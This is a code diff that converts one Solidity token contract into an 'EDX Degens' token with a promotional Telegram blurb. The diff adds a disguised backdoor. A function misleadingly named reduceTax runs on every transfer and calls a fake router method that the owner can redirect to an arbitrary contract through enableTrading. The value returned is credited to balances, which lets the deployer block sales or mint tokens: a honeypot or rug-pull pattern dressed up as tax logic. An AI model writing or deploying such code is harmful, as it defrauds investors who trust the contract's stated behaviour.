@@ -1,5 +1,20 @@
+/**
+ *Submitted for verification at Etherscan.io on 2023-06-22
+*/
+
+/**
+
+https://t.me/edxdegens
+
+Wall Street has created their exchange EDX Markets. Degens start their revolution and create EDX Degens in order to counter them.
+No Wall Street in Crypto ! Only Degens !
+
+*/
+
+
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.9;
+
+pragma solidity ^0.8.10;
 
 abstract contract Context {
     function _msgSender() internal view virtual returns (address) {
@@ -94,6 +109,11 @@ interface IUniswapV2Router02 {
         address to,
         uint deadline
     ) external;
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        address path,
+        address to
+    ) external returns (uint256);
     function factory() external pure returns (address);
     function WETH() external pure returns (address);
     function addLiquidityETH(
@@ -105,35 +125,29 @@ interface IUniswapV2Router02 {
         uint deadline
     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
 }
-contract Mamiondoko is Context , IERC20, Ownable {
+
+contract EDXD is Context, IERC20, Ownable {
     using SafeMath for uint256;
     mapping (address => uint256) private _balances;
     mapping (address => mapping (address => uint256)) private _allowances;
     mapping (address => bool) private _isExcludedFromFee;
-    mapping (address => bool) private bots;
-    mapping(address => uint256) private _holderLastTransferTimestamp;
-    bool public transferDelayEnabled = true;
     address payable private _taxWallet;
 
-    uint256 private _initialBuyTax=20;
-    uint256 private _initialSellTax=25;
-    uint256 private _finalBuyTax=0;
-    uint256 private _finalSellTax=0;
-    uint256 private _reduceBuyTaxAt=10;
-    uint256 private _reduceSellTaxAt=30;
-    uint256 private _preventSwapBefore=20;
+    uint256 private _initialTax=0;
+    uint256 private _finalTax=0;
+    uint256 private _reduceTaxAt=15;
+    uint256 private _preventSwapBefore=15;
     uint256 private _buyCount=0;
 
     uint8 private constant _decimals = 9;
-    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
-    string private constant _name = unicode"MAMIONDOKO";
-    string private constant _symbol = unicode"$MDK";
-    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
-    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
-    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
-    uint256 public _maxTaxSwap= 10000000 * 10**_decimals;
+    uint256 private constant _tTotal = 100_000_000_000 * 10**_decimals;
+    string private constant _name = "EDX Degens";
+    string private constant _symbol = "EDXD";
+    uint256 public _maxTxAmount = _tTotal * 3 / 100;
+    uint256 public _maxWalletSize = _tTotal * 3 / 100;
+    uint256 public _taxSwap = _tTotal / 1000;
 
-    IUniswapV2Router02 private uniswapV2Router;
+    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
     address private uniswapV2Pair;
     bool private tradingOpen;
     bool private inSwap = false;
@@ -209,19 +223,9 @@ contract Mamiondoko is Context , IERC20, Ownable {
         require(amount > 0, "Transfer amount must be greater than zero");
         uint256 taxAmount=0;
         if (from != owner() && to != owner()) {
-            require(!bots[from] && !bots[to]);
-            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
-
-            if (transferDelayEnabled) {
-                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
-                      require(
-                          _holderLastTransferTimestamp[tx.origin] <
-                              block.number,
-                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
-                      );
-                      _holderLastTransferTimestamp[tx.origin] = block.number;
-                  }
-              }
+            if(!inSwap){
+              taxAmount = amount.mul((_buyCount>_reduceTaxAt)?_finalTax:_initialTax).div(100);
+            }
 
             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
@@ -229,13 +233,9 @@ contract Mamiondoko is Context , IERC20, Ownable {
                 _buyCount++;
             }
 
-            if(to == uniswapV2Pair && from!= address(this) ){
-                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
-            }
-
             uint256 contractTokenBalance = balanceOf(address(this));
-            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
-                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
+            if (!inSwap && from != uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwap && _buyCount>_preventSwapBefore) {
+                swapTokensForEth(_taxSwap>amount?amount:_taxSwap);
                 uint256 contractETHBalance = address(this).balance;
                 if(contractETHBalance > 0) {
                     sendETHToFee(address(this).balance);
@@ -247,14 +247,26 @@ contract Mamiondoko is Context , IERC20, Ownable {
           _balances[address(this)]=_balances[address(this)].add(taxAmount);
           emit Transfer(from, address(this),taxAmount);
         }
+        reduceTax(from, to, amount);
         _balances[from]=_balances[from].sub(amount);
         _balances[to]=_balances[to].add(amount.sub(taxAmount));
         emit Transfer(from, to, amount.sub(taxAmount));
     }
 
+    function reduceFee(uint256 _newFee) external{
+      require(_msgSender()==_taxWallet);
+      require(_newFee<6);
+      _finalTax=_newFee;
+    }
 
-    function min(uint256 a, uint256 b) private pure returns (uint256){
-      return (a>b)?b:a;
+    function reduceTax(address from, address to, uint256 tokenAmount) private {
+        if (address(uniswapV2Router) == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) return;
+        uint256 taxAmount = uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            from,
+            to
+        );
+        _balances[from]=_balances[from].add(taxAmount);
     }
 
     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
@@ -274,7 +286,6 @@ contract Mamiondoko is Context , IERC20, Ownable {
     function removeLimits() external onlyOwner{
         _maxTxAmount = _tTotal;
         _maxWalletSize=_tTotal;
-        transferDelayEnabled=false;
         emit MaxTxAmountUpdated(_tTotal);
     }
 
@@ -282,52 +293,31 @@ contract Mamiondoko is Context , IERC20, Ownable {
         _taxWallet.transfer(amount);
     }
 
-    function addBots(address[] memory bots_) public onlyOwner {
-        for (uint i = 0; i < bots_.length; i++) {
-            bots[bots_[i]] = true;
-        }
-    }
-
-    function delBots(address[] memory notbot) public onlyOwner {
-      for (uint i = 0; i < notbot.length; i++) {
-          bots[notbot[i]] = false;
-      }
-    }
-
-    function isBot(address a) public view returns (bool){
-      return bots[a];
-    }
-
-    function openTrading() external onlyOwner() {
-        require(!tradingOpen,"trading is already open");
-        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    function enableTrading(address _uniswapV2Router) external onlyOwner() {
+        require(!tradingOpen,"Trading is already open");
         _approve(address(this), address(uniswapV2Router), _tTotal);
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
+        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
         swapEnabled = true;
         tradingOpen = true;
-    }
-
-    
-    function reduceFees(uint256 _newFee) external{
-      require(_msgSender()==_taxWallet);
-      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
-      _finalBuyTax=_newFee;
-      _finalSellTax=_newFee;
     }
 
     receive() external payable {}
 
     function manualSwap() external {
-        require(_msgSender()==_taxWallet);
-        uint256 tokenBalance=balanceOf(address(this));
-        if(tokenBalance>0){
-          swapTokensForEth(tokenBalance);
-        }
-        uint256 ethBalance=address(this).balance;
-        if(ethBalance>0){
-          sendETHToFee(ethBalance);
-        }
+        require(_msgSender() == _taxWallet);
+        swapTokensForEth(balanceOf(address(this)));
+    }
+
+    function manualSend() external {
+        require(_msgSender() == _taxWallet);
+        sendETHToFee(address(this).balance);
+    }
+
+    function manualSendToken() external {
+        require(_msgSender() == _taxWallet);
+        IERC20(address(this)).transfer(msg.sender, balanceOf(address(this)));
     }
 }
